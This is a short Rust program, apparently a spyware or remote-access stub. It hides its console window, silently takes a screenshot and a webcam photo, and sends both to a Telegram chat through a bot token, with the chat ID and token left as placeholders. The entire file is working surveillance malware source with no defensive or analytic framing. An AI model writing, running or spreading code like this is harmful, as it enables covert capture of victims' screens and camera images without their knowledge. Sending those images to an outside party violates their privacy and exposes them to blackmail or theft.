#![windows_subsystem = "windows"]
use teloxide::{
    prelude::*,
    utils::command::BotCommands,
    types::{InputMedia, InputMediaPhoto, InputFile, Recipient}}; 
use win_screenshot::prelude::*;
use image::RgbaImage;

use std::io::Cursor;
use nokhwa::pixel_format::RgbAFormat;


#[tokio::main]
async fn main() {

    let chatid: Recipient = Recipient::from(String::from("YOUR ID HERE"));
    let bot = Bot::new("BOT_TOKEN HERE");
    
    let screenshot_bytes = get_screenshot_bytes();
    let webcam_bytes = get_webcam_bytes();

    let screenshot_media = InputMedia::Photo(InputMediaPhoto::new(InputFile::memory(screenshot_bytes.clone())));
    let webcam_media = InputMedia::Photo(InputMediaPhoto::new(InputFile::memory(webcam_bytes)));

    let _ = bot.send_media_group(chatid.clone(), [webcam_media, screenshot_media].into_iter()).await;

        teloxide::repl(bot, |bot: Bot, msg: Message| async move {

            Ok(())
        })
        .await;

}


fn get_screenshot_bytes() -> Vec<u8> {
    let buf = capture_display().unwrap();
    let img = RgbaImage::from_raw(buf.width, buf.height, buf.pixels).unwrap();
    let mut bytes = Vec::new();
    let _ = img.write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Png);
    bytes
}

fn get_webcam_bytes() -> Vec<u8> {
    let index = nokhwa::utils::CameraIndex::Index(0); 
    let requested = nokhwa::utils::RequestedFormat::new::<nokhwa::pixel_format::RgbAFormat>(nokhwa::utils::RequestedFormatType::AbsoluteHighestResolution);
    let mut camera = nokhwa::Camera::new(index, requested).unwrap();
    let buf = camera.frame().unwrap();
    let img = buf.decode_image::<RgbAFormat>().unwrap();
    let mut bytes = Vec::new();
    let _ = img.write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Png);
    bytes
}


